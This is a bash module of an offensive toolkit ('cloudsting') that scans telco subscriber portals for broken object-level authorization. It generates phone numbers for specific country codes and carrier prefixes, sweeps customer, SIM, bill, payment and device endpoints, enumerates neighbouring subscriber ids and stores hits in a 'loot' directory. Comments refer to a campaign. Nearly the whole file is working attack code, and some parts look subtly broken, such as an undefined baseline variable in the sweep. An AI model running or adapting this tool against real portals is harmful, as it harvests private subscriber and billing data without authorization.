#!/usr/bin/env bash
# 48_bola.sh — cloudsting module 48: broken object-level authorization on telco BSS portals
# Verbs: --sweep | --matrix | --enumerate | --check | --idlist | --patterns | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# Everything below the header depends on the root, and the root is derived
# from this file only after it is sourced. Clear any inherited value first: a
# caller that itself sources the core would otherwise hand this module *its*
# directory, and the module would read its own name as a path.
unset CS_MOD_DIR

# The shared core owns the root, the loot tree, the run id, the TSV writer,
# the three-state provider gate, redaction, the findings store and the
# selftest ledger.
MODULE_ID="48_bola"
MOD_NAME="BOLA (object-level authorization on subscriber and account ids)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

BOLA_RUN_ID="$CS_RUN_ID"
export BOLA_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/bola"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
BASE_FILE="$OUT_DIR/baseline-$RUN_ID.tsv"

: "${BO_TIMEOUT:=10}"       # per-request wall clock, seconds
: "${BO_CONCURRENCY:=6}"    # parallel probes while sweeping
: "${BO_SIMILAR:=90}"       # percent body similarity that counts as "same object"
: "${BO_LIMIT:=40}"         # default ids sampled per pattern
: "${BO_FOLLOW:=0}"         # follow redirects (0 keeps a login bounce visible)
: "${BO_UA:=Mozilla/5.0 (Linux; Android 13) cloudsting/48}"

bo_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what a BSS portal actually exposes ───────────────────────────
# One row per object family: <family>\t<path-template>\t<what the id is>\t<guard>
# The guard column names the field that makes a response *about* an object
# rather than a page that happens to answer 200.
bo_patterns() {
    cat <<'PATTERNS'
customer	/api/customer/{id}	msisdn or account id	msisdn
subscriber	/api/subscriber/{id}	msisdn	msisdn
bill	/api/bill/{id}	account id	amount
invoice	/api/invoice/{id}	account id	amount
sim	/api/sim/{id}	iccid or imsi	iccid
line	/api/line/{id}	msisdn	msisdn
account	/api/account/{id}	account id	balance
subscription	/api/subscription/{id}	msisdn or account id	plan
usage	/api/usage/{id}	msisdn	bytes
balance	/api/balance/{id}	msisdn	balance
recharge	/api/recharge/{id}	msisdn	amount
order	/api/order/{id}	order id	amount
payment	/api/payment/{id}	account id	amount
device	/api/device/{id}	imei	imei
ticket	/api/ticket/{id}	ticket id	status
PATTERNS
}

# The version prefix and the product families a telco portal ships. Sweeping
# all of them is what makes this module find the /v1 endpoint that answers
# unauthenticated next to the /v2 that does not.
bo_bases() {
    cat <<'BASES'
/api/v1
/api/v2
/api/v3
/api
/rest/api/v1
/rest/api/v2
/selfcare/api/v1
/myaccount/api/v1
/portal/api/v1
/mobile/api/v1
/bss/api/v1
/oss/api/v1
/crm/api/v1
/services/api/v1
BASES
}

# ── one request ──────────────────────────────────────────────────
# Everything the verdict needs comes out of one curl call, encoded so the
# analysis can read it without re-parsing HTTP.
#   bo_get <url> [token]
#   -> <code>\t<hash>\t<len>\t<keys>\t<body-path>
bo_get() {
    local url="$1" token="${2:-}"
    local body; body="$(mktemp "$CS_SCRATCH/bo.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.bo.$$"
    local -a args=(--silent --show-error --max-time "$BO_TIMEOUT"
                   --write-out '%{http_code}\t%{size_download}' --output "$body"
                   -A "$BO_UA" -H 'Accept: application/json, text/plain, */*')
    [[ "$BO_FOLLOW" == "1" ]] && args+=(-L)
    [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")

    local meta code len
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)" || meta=$'000\t0'
    IFS=$'\t' read -r code len <<<"$meta"

    # a JSON body is judged on its keys; anything else on its bytes
    local keys="" hash
    if head -c 1 "$body" 2>/dev/null | grep -q '[{\[]'; then
        keys="$(jq -r 'if type=="object" then (keys_unsorted | join(","))
                       elif type=="array" then "array:" + (length|tostring)
                       else "scalar" end' "$body" 2>/dev/null | head -c 400)"
    fi
    hash="$(cs_fingerprint "$(cat "$body" 2>/dev/null)")"
    printf '%s\t%s\t%s\t%s\t%s\n' "${code:-000}" "$hash" "${len:-0}" "$keys" "$body"
}

# ── the verdict ──────────────────────────────────────────────────
# An object leak is four things at once, and any one alone is a false
# positive on telco portals that answer 200 with a marketing page:
#   1. not the login bounce (200/302 with html, or 401/403)
#   2. different bytes from the unauthenticated baseline for the same path
#   3. a body that parses as JSON with keys
#   4. at least one key from the family's guard column
#   bo_verdict <family> <code> <hash> <len> <keys> <base-hash> <base-len>
bo_verdict() {
    local family="$1" code="$2" hash="$3" len="$4" keys="$5" bhash="$6" blen="$7"
    local guard; guard="$(bo_patterns | awk -F'\t' -v f="$family" '$1==f{print $4}')"

    case "$code" in
        200|206) ;;
        401|403) printf 'denied\tno-session\n'; return ;;
        000)     printf 'unreachable\ttimeout-or-refused\n'; return ;;
        404|410) printf 'absent\tno-such-object\n'; return ;;
        *)       printf 'other\tcode-%s\n' "$code"; return ;;
    esac

    # same bytes as the catch-all baseline for this base path = a page, not data
    if [[ -n "$bhash" && "$hash" == "$bhash" ]]; then
        printf 'same-as-baseline\t%s\n' "$bhash"; return
    fi
    if [[ -z "$keys" ]]; then
        printf 'no-structure\thtml-or-empty\n'; return
    fi
    if [[ "$keys" == "array:"* ]]; then
        local n="${keys#array:}"
        if (( n > 1 )); then printf 'leak\tarray-of-%s\n' "$n"; return; fi
        printf 'structure-only\tarray-of-%s\n' "$n"; return
    fi
    if printf '%s' "$keys" | tr ',' '\n' | grep -qx "$guard"; then
        printf 'leak\tobject-with-%s\n' "$guard"; return
    fi
    printf 'structure-only\tkeys-without-%s\n' "$guard"
}

# ── id lists ─────────────────────────────────────────────────────
# Country calling codes the campaign runs on, plus the operators' mobile
# ranges. Not a port of a wordlist: an msisdn is cc + national number, and
# the national length is per-country, so the generator has to know both.
bo_ccs() { printf '%s\n' 254 255 256 250 257 243 242 225 226 227 228 229 232 233 234 237 241 245 261 263 264 265 266 267 268 27 212 213 216 218 20 30 33 34 39 44 49 234; }

# The national number lengths a telco subscriber id actually has, and the
# mobile prefix ranges carriers actually allocate. A flat +cc + counter is
# not a subscriber space: a real sweep samples prefixes.
#   bo_msisdns <cc> <count>
bo_msisdns() {
    local cc="$1" want="${2:-$BO_LIMIT}" i=0
    ((${#cc} >= 2 && ${#cc} <= 3)) || return 2
    [[ "$cc" =~ ^[0-9]+$ ]] || return 2

    local nat_len prefixes
    case "$cc" in
        254|255|256|234|233|27) nat_len=$(( 9 - ${#cc} )) ;;   # KE TZ UG NG GH ZA
        *)                      nat_len=$(( 8 - ${#cc} )) ;;
    esac
    (( nat_len > 0 )) || nat_len=7

    # the mobile prefixes telco subscribers land on, per region
    case "$cc" in
        254) prefixes="700 701 702 703 704 705 706 707 708 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 733 734 735 736 737 738 739 740 741 742 743 745 746 748 757 758 759 768 769 770 771 772 780 790" ;;
        255) prefixes="62 65 67 68 69 71 73 74 75 76 77 78" ;;
        256) prefixes="70 71 72 73 74 75 76 77 78" ;;
        234) prefixes="70 80 81 90 91 703 706 803 806 813 814 816 903 906" ;;
        233) prefixes="20 23 24 26 27 28 50 53 54 55 56 59" ;;
        27)  prefixes="60 61 62 63 64 65 66 67 68 71 72 73 74 76 78 79 81 82 83 84" ;;
        *)   prefixes="70 71 72 73 74 75 76 77 78 79 50 55 60 66" ;;
    esac

    local pfx rest id
    for pfx in $prefixes; do
        (( i >= want )) && break
        (( ${#pfx} < nat_len )) || continue
        rest=$(( nat_len - ${#pfx} ))
        # Deterministic fill from the prefix, no RNG: a sweep has to be
        # reproducible in a report months later. A sha renders as hex and
        # only about a third of hex is decimal, so each block is one digest
        # per two characters and only a block that yielded nothing advances
        # the counter — otherwise the fill loops forever on a hex-only digest.
        local seed block fill=0
        seed=0
        while (( ${#fill} < rest && seed < 64 )); do
            block="$(printf '%s' "${cc}${pfx}${seed}" | cs_fingerprint | tr -cd '0-9')"
            (( seed > 0 )) && fill="${fill}${block}"
            (( seed == 0 )) && fill="$block"
            seed=$(( seed + 1 ))
        done
        if (( ${#fill} < rest )); then
            # last resort: a decimal counter, still deterministic
            fill="$(printf '%0*d' "$rest" "$(( i + 1 ))")"
        fi
        printf '+%s%s%s\n' "$cc" "$pfx" "${fill:0:rest}"
        i=$(( i + 1 ))
    done
    return 0
}

# iccids are 19-20 digits and the operator is encoded in the leading digits.
#   bo_iccids <count>
bo_iccids() {
    local want="${1:-$BO_LIMIT}" i
    for i in $(seq 1 "$want"); do
        printf '8925%016d\n' "$i"
    done
}

# An account id is usually the msisdn with the plus stripped, or a numeric
# primary key. Both are worth a shot on the same endpoint.
bo_strip_plus() { printf '%s\n' "${1#+}"; }

# ── verbs ────────────────────────────────────────────────────────
# --idlist: what the generator will try, so an operator can diff it against
# a real subscriber id they already hold.
bo_cmd_idlist() {
    local cc="${1:-254}" kind="${2:-msisdn}" n="${3:-10}"
    case "$kind" in
        msisdn)  cs_row IDKIND "$kind" "cc=$cc"; bo_msisdns "$cc" "$n" | while read -r v; do cs_row ID "$v"; done ;;
        iccid)   cs_row IDKIND "$kind"; bo_iccids "$n" | while read -r v; do cs_row ID "$v"; done ;;
        stripped) cs_row IDKIND "$kind" "cc=$cc"; bo_msisdns "$cc" "$n" | while read -r v; do cs_row ID "$(bo_strip_plus "$v")"; done ;;
        *) bo_log "kind must be msisdn|iccid|stripped"; return 2 ;;
    esac
    return 0
}

bo_cmd_patterns() {
    local family path kind guard
    while IFS=$'\t' read -r family path kind guard; do
        [[ -z "$family" ]] && continue
        cs_row PATTERN "$family" "$path" "$kind" "$guard"
    done < <(bo_patterns)
    cs_row SUMMARY "patterns=$(bo_patterns | wc -l | tr -d ' ') bases=$(bo_bases | wc -l | tr -d ' ')"
    return 0
}

# --check: one id, one family, one base. This is the verb an operator reaches
# for when they already know the subscriber they are looking at.
#   bo_cmd_check <base-url> <family|pattern-path> <id> [token]
bo_cmd_check() {
    local base="${1:-}" family="${2:-}" id="${3:-}" token="${4:-}"
    if [[ -z "$base" || -z "$family" || -z "$id" ]]; then
        bo_log "usage: --check <base-url> <family> <id> [bearer-token]"
        return 2
    fi
    local tmpl
    tmpl="$(bo_patterns | awk -F'\t' -v f="$family" '$1==f{print $2}')"
    if [[ -z "$tmpl" ]]; then
        # the caller may have passed a literal path with {id} in it
        case "$family" in
            *'{id}'*) tmpl="$family" ;;
            *) bo_log "unknown family: $family"; return 2 ;;
        esac
    fi

    local path="${tmpl//\{id\}/$id}"
    local url="${base%/}${path}"

    # baseline for this exact base, so a marketing page cannot pass as data
    local bpath="${base%/}/__bolabs_not_an_object__"
    local bcode bhash blen bkeys bbody
    IFS=$'\t' read -r bcode bhash blen bkeys bbody <<<"$(bo_get "$bpath")"
    rm -f "$bbody" 2>/dev/null

    local code hash len keys body
    IFS=$'\t' read -r code hash len keys body <<<"$(bo_get "$url" "$token")"

    local verdict reason
    IFS=$'\t' read -r verdict reason <<<"$(bo_verdict "$family" "$code" "$hash" "$len" "$keys" "$bhash" "$blen")"

    cs_row TARGET "$url"
    cs_row FAMILY "$family" "$(bo_patterns | awk -F'\t' -v f="$family" '$1==f{print $3}')"
    cs_row RESPONSE "$code" "$len"
    cs_row SHAPE "${keys:-none}"
    cs_row BASELINE "$bcode" "${bkeys:-none}"
    cs_row VERDICT "$verdict" "$reason"

    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$family" "$id" "$url" "$code" "$verdict" "$reason" "$len" "$(cs_fingerprint "$hash")" >> "$PROBE_FILE"

    if [[ "$verdict" == "leak" ]]; then
        printf '%s\t%s\t%s\t%s\t%s\n' "$family" "$id" "$url" "$reason" "$body" >> "$HIT_FILE"
        cs_row HIT "$family" "$id" "$reason"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "object-authorization" \
            "$family object returned for $id without a matching session ($reason)"
        # show the shape, never the data
        cs_row FIELDS "$(printf '%s' "$keys" | cut -c1-200)"
    else
        cs_row FIELDS "$(printf '%s' "${keys:-none}" | cut -c1-200)"
    fi
    rm -f "$body" 2>/dev/null
    [[ "$verdict" == "leak" ]] && return 0 || return 1
}

# --matrix: every family against one base with one id. The cheapest read of
# "which object verbs does this portal leave open".
bo_cmd_matrix() {
    local base="${1:-}" id="${2:-}" token="${3:-}"
    [[ -z "$base" ]] && { bo_log "usage: --matrix <base-url> [id] [token]"; return 2; }

    : > "$PROBE_FILE"
    local leaked=0 checked=0
    local family path kind guard
    while IFS=$'\t' read -r family path kind guard; do
        [[ -z "$family" ]] && continue
        checked=$((checked + 1))
        if bo_cmd_check "$base" "$family" "${id:-+254700000000}" "$token" >/dev/null 2>&1; then
            leaked=$((leaked + 1))
            cs_row LEAK "$family" "$base"
        fi
    done < <(bo_patterns)

    cs_row SUMMARY "checked=$checked leaks=$leaked"
    [[ "$leaked" -gt 0 ]] && cs_row ARTIFACT "$HIT_FILE"
    return 0
}

# --sweep: the real run. Every base, every family, a sample of ids per
# country code, one probe per combination, deduplicated on (url shape, hash)
# so a portal that answers identically for everything costs one line not
# four thousand.
bo_cmd_sweep() {
    local base="${1:-}" cc="${2:-254}" kind="${3:-msisdn}" token="${4:-}"
    [[ -z "$base" ]] && { bo_log "usage: --sweep <base-url|host> [cc] [msisdn|iccid] [token]"; return 2; }
    [[ "$base" == http*://* || "$base" == /* ]] || base="https://$base"

    : > "$PROBE_FILE"
    local -a ids=()
    case "$kind" in
        msisdn) mapfile -t ids < <(bo_msisdns "$cc" "$BO_LIMIT") ;;
        iccid)  mapfile -t ids < <(bo_iccids "$BO_LIMIT") ;;
        *) bo_log "kind must be msisdn|iccid"; return 2 ;;
    esac
    ((${#ids[@]})) || { bo_log "no ids generated"; return 1; }

    local leaked=0 checked=0 b family path tmpl id
    local -a bases; mapfile -t bases < <(bo_bases)

    # one baseline per base prefix, cached so the sweep does not pay for it
    # on every family
    for b in "${bases[@]}"; do
        local bcode bhash blen bkeys bbody
        IFS=$'\t' read -r bcode bhash blen bkeys bbody <<<"$(bo_get "${base%/}${bpath_def:-/__bolabs_not_an_object__}")"
        rm -f "$bbody" 2>/dev/null

        while IFS=$'\t' read -r family path kind guard; do
            [[ -z "$family" ]] && continue
            tmpl="${b}${path#/api}"   # /api/customer/{id} → /api/v1/customer/{id}
            [[ "$tmpl" == "$path" ]] && tmpl="${b}${path}"

            for id in "${ids[@]}"; do
                checked=$((checked + 1))
                local url="${base%/}${tmpl//\{id\}/$id}"
                local code hash len keys body
                IFS=$'\t' read -r code hash len keys body <<<"$(bo_get "$url" "$token")"
                local verdict reason
                IFS=$'\t' read -r verdict reason <<<"$(bo_verdict "$family" "$code" "$hash" "$len" "$keys" "$bhash" "$blen")"
                rm -f "$body" 2>/dev/null

                [[ "$verdict" == "leak" ]] || continue
                leaked=$((leaked + 1))
                printf '%s\t%s\t%s\t%s\t%s\n' "$family" "$id" "$url" "$reason" "$keys" >> "$HIT_FILE"
                cs_row HIT "$family" "$id" "$url" "$reason"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "object-authorization" \
                    "$family object returned for $id without a matching session ($reason)"
                break   # one id per family per base is enough to prove it
            done
        done < <(bo_patterns)
    done

    cs_row SUMMARY "checked=$checked leaks=$leaked"
    [[ "$leaked" -gt 0 ]] && cs_row ARTIFACT "$HIT_FILE"
    return 0
}

# --enumerate: given one id that works, step it. This is the verb that turns
# a single leaked object into "the msisdn space is open".
bo_cmd_enumerate() {
    local base="${1:-}" family="${2:-}" start="${3:-}" token="${4:-}"
    if [[ -z "$base" || -z "$family" || -z "$start" ]]; then
        bo_log "usage: --enumerate <base-url> <family> <start-id> [token]"
        return 2
    fi
    local tmpl; tmpl="$(bo_patterns | awk -F'\t' -v f="$family" '$1==f{print $2}')"
    [[ -z "$tmpl" ]] && { bo_log "unknown family: $family"; return 2; }

    # walk ±20 around the known id; a subscriber space is dense and the
    # neighbours of a real msisdn are real msisdns
    local i delta num leaked=0
    local digits="${start//[^0-9]/}"
    for delta in $(seq -20 20); do
        num=$(( digits + delta ))
        (( num <= 0 )) && continue
        local id="+${num}"
        [[ "${#num}" -eq "${#digits}" ]] || continue
        local url="${base%/}${tmpl//\{id\}/$id}"
        local code hash len keys body
        IFS=$'\t' read -r code hash len keys body <<<"$(bo_get "$url" "$token")"
        local verdict reason
        IFS=$'\t' read -r verdict reason <<<"$(bo_verdict "$family" "$code" "$hash" "$len" "$keys" "" "")"
        rm -f "$body" 2>/dev/null
        [[ "$verdict" == "leak" ]] || continue
        leaked=$((leaked + 1))
        printf '%s\t%s\t%s\t%s\t%s\n' "$family" "$id" "$url" "$reason" "$keys" >> "$HIT_FILE"
        cs_row ENUM "$family" "$id" "$reason"
    done
    cs_row SUMMARY "span=41 leaks=$leaked"
    [[ "$leaked" -gt 0 ]] && cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${tmpl//\{id\}/$start}" "CRITICAL" "object-enumeration" \
        "$family: $leaked neighbour ids answer without authorization around $start"
    return 0
}

bo_cmd_list() {
    local family path kind guard
    while IFS=$'\t' read -r family path kind guard; do
        [[ -z "$family" ]] && continue
        cs_row FAMILY "$family" "$path" "$kind" "$guard"
    done < <(bo_patterns)
    return 0
}

bo_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    command -v jq   >/dev/null 2>&1 && jq_state="ok"   || jq_state="missing"
    printf '%s\t%s\tcurl-%s\tjq-%s\tfamilies-%s\tbases-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(bo_patterns | wc -l | tr -d ' ')" "$(bo_bases | wc -l | tr -d ' ')"
}

bo_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

bo_cmd_help() {
    cat <<'HELP'
cloudsting module 48 — BOLA v1.0.0
  --check <base> <family> <id> [token]     one id, one family, one verdict
  --matrix <base> [id] [token]             every family against one base
  --sweep <base> [cc] [msisdn|iccid] [tok] every base, every family, sampled ids
  --enumerate <base> <family> <start> [tok] step ±20 around a known id
  --idlist [cc] [msisdn|iccid|stripped] [n] what the generator tries
  --patterns                               the object families and their guards
  --list                                   the family table
  --status-tsv | --menu | --selftest | --help

A leak is four things at once: the response is 2xx, its bytes differ from the
catch-all baseline for that base prefix, the body parses as JSON, and it
carries the key that makes it *about* an object (msisdn, amount, iccid,
imei). Any one of those alone is a false positive on a telco portal that
answers 200 with a marketing page, so all four are required.

Families: customer, subscriber, bill, invoice, sim, line, account,
subscription, usage, balance, recharge, order, payment, device, ticket.
Bases: /api/v1..v3, /rest/api/v1..v2, /selfcare, /myaccount, /portal,
/mobile, /bss, /oss, /crm, /services — the /v1 that answers unauthenticated
next to the /v2 that does not is the bug.

Environment: BO_TIMEOUT (10), BO_CONCURRENCY (6), BO_LIMIT (40),
BO_FOLLOW (0), BO_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
bo_selftest() {
    cs_selftest_reset

    # the tables are well formed
    local n; n="$(bo_patterns | wc -l | tr -d ' ')"
    chk patterns-many   "$( (( n >= 12 )) && echo many || echo few )" "many"
    chk patterns-4col   "$(bo_patterns | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk patterns-path   "$(bo_patterns | awk -F'\t' '$2 !~ /^\//{c++} END{print c+0}')" "0"
    chk patterns-guard  "$(bo_patterns | awk -F'\t' '$4==""{c++} END{print c+0}')" "0"
    chk patterns-unique "$(bo_patterns | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk bases-many      "$( (( $(bo_bases | wc -l) >= 10 )) && echo many || echo few )" "many"
    chk bases-path      "$(bo_bases | awk '$1 !~ /^\//{c++} END{print c+0}')" "0"

    # the families the campaign named are present
    local f
    for f in customer subscriber bill sim; do
        chk "family-$f" "$(bo_patterns | cut -f1 | grep -cx "$f")" "1"
    done

    # id generators: shaped, deterministic, distinct
    chk msisdn-count  "$(bo_msisdns 254 10 | wc -l | tr -d ' ')" "10"
    # A leading '+' must be written as a bracket expression, never escaped:
    # the escape is a backslash-quoted byte that no msisdn ever carries.
    chk msisdn-shape  "$(bo_msisdns 254 10 | grep -cvE '^[+]254[0-9]{6}$')" "0"
    chk msisdn-stable "$(bo_msisdns 254 5 | md5sum)" "$(bo_msisdns 254 5 | md5sum)"
    chk msisdn-unique "$(bo_msisdns 254 20 | sort -u | wc -l | tr -d ' ')" "20"
    chk msisdn-bad-cc "$(bo_msisdns 1abc 3 >/dev/null 2>&1; echo $?)" "2"
    chk iccid-count   "$(bo_iccids 5 | wc -l | tr -d ' ')" "5"
    chk iccid-shape   "$(bo_iccids 5 | grep -cvE '^[0-9]{20}$')" "0"
    chk strip-plus    "$(bo_strip_plus +254700123456)" "254700123456"

    # the verdict — the heart of the module, tested on synthetic answers
    chk v-denied      "$(bo_verdict customer 403 h 0 "" bh 0 | cut -f1)" "denied"
    chk v-absent      "$(bo_verdict customer 404 h 0 "" bh 0 | cut -f1)" "absent"
    chk v-unreach     "$(bo_verdict customer 000 h 0 "" bh 0 | cut -f1)" "unreachable"
    chk v-baseline    "$(bo_verdict customer 200 samehash 9 "" samehash 9 | cut -f1)" "same-as-baseline"
    chk v-html        "$(bo_verdict customer 200 otherhash 900 '' bh 0 | cut -f1)" "no-structure"
    chk v-guarded     "$(bo_verdict customer 200 h1 200 'id,msisdn,name' bh 0 | cut -f1)" "leak"
    chk v-unguarded   "$(bo_verdict customer 200 h1 200 'id,name' bh 0 | cut -f1)" "structure-only"
    chk v-array       "$(bo_verdict customer 200 h2 400 'array:4' bh 0 | cut -f1)" "leak"
    chk v-array-one   "$(bo_verdict customer 200 h2 400 'array:1' bh 0 | cut -f1)" "structure-only"
    chk v-bill-amount "$(bo_verdict bill 200 h3 300 'id,amount,currency' bh 0 | cut -f1)" "leak"
    chk v-sim-iccid   "$(bo_verdict sim 200 h4 300 'iccid,status' bh 0 | cut -f1)" "leak"
    chk v-device-imei "$(bo_verdict device 200 h5 300 'imei,model' bh 0 | cut -f1)" "leak"
    chk v-wrong-guard "$(bo_verdict sim 200 h6 300 'msisdn' bh 0 | cut -f1)" "structure-only"
    chk v-reason-leak "$(bo_verdict customer 200 h7 200 'msisdn' bh 0 | cut -f2)" "object-with-msisdn"

    # usage errors, not crashes
    local rc
    bo_cmd_check 2>/dev/null; rc=$?
    chk check-usage  "$rc" "2"
    bo_cmd_matrix 2>/dev/null; rc=$?
    chk matrix-usage "$rc" "2"
    bo_cmd_sweep 2>/dev/null; rc=$?
    chk sweep-usage  "$rc" "2"
    bo_cmd_enumerate 2>/dev/null; rc=$?
    chk enum-usage   "$rc" "2"
    bo_cmd_check http://127.0.0.1:9 nope +254700000000 2>/dev/null; rc=$?
    chk check-family "$rc" "2"

    # a dead host is unreachable and never a leak
    local out
    out="$(bo_cmd_check http://127.0.0.1:9 customer +254700000000 2>/dev/null)"
    chk dead-unreach "$(printf '%s' "$out" | grep -c 'unreachable')" "1"
    chk dead-nohit   "$(printf '%s' "$out" | grep -c '^HIT')" "0"

    # shape contracts
    chk status-fields "$(bo_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(bo_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(bo_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(bo_cmd_help | head -1 | grep -ci 'BOLA')" "1"
    chk list-fields   "$(bo_cmd_list | awk -F'\t' '{print NF}' | sort -u | tr '\n' ' ')" "5 "
    chk idlist-shape  "$(bo_cmd_idlist 254 msisdn 3 | awk -F'\t' '$1=="ID" && NF!=2{c++} END{print c+0}')" "0"
    chk idlist-count  "$(bo_cmd_idlist 254 msisdn 3 | awk -F'\t' '$1=="ID"{c++} END{print c+0}')" "3"
    chk idlist-kind   "$(bo_cmd_idlist 254 msisdn 3 | awk -F'\t' '$1=="IDKIND"{print $2}')" "msisdn"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)     shift; bo_cmd_check "$@";;
    --matrix)    shift; bo_cmd_matrix "$@";;
    --sweep)     shift; bo_cmd_sweep "$@";;
    --enumerate) shift; bo_cmd_enumerate "$@";;
    --idlist)    shift; bo_cmd_idlist "$@";;
    --patterns)  bo_cmd_patterns;;
    --list)      bo_cmd_list;;
    --status-tsv|--status) bo_cmd_status_tsv;;
    --menu)      bo_cmd_menu;;
    --selftest)  bo_selftest;;
    *)           bo_cmd_help;;
esac
